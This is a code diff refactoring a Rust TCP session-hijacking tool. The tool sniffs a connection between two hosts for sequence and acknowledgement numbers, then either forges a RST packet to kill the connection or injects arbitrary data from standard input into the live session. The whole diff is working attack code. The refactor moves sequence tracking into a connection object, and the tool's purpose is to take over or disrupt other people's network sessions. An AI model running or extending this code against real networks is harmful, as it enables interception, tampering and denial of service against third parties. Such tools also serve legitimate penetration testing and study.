@@ -44,16 +44,13 @@ fn run() -> Result<()> {
     println!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
     println!("(To speed things up, try making some traffic between the two, /msg person asdf)");
 
-    let (mut seq, ack, offset) = net::getseqack(&arguments.interface, &arguments.src, &arguments.dst)?;
-    println!("[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}", seq, ack);
+    let mut connection = net::getseqack(&arguments.interface, &arguments.src, &arguments.dst)?;
+    println!("[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}", connection.seq, connection.ack);
 
     let (mut tx, _rx) = net::create_socket()?;
 
-    // bump seq
-    seq += offset as u32;
-
     if arguments.reset {
-        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::RST, seq, 0, &[])?;
+        connection.reset(&mut tx)?;
         println!("[+] Connection has been reset");
         return Ok(());
     }
@@ -62,8 +59,7 @@ fn run() -> Result<()> {
         info!("Sending 1kb of null bytes to prevent desync");
 
         let data = vec![0; 1024];
-        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data)?;
-        seq += data.len() as u32;
+        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data)?;
     }
 
     println!("Starting hijack session, Please use ^D to terminate.");
@@ -78,13 +74,10 @@ fn run() -> Result<()> {
             break;
         }
 
-        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data[..len])?;
-
-        // bump seq afterwards
-        seq += len as u32;
+        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data[..len])?;
     }
 
-    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::FIN, seq, ack, &[])?;
+    connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::FIN, &[])?;
     println!("Exiting..");
 
     Ok(())
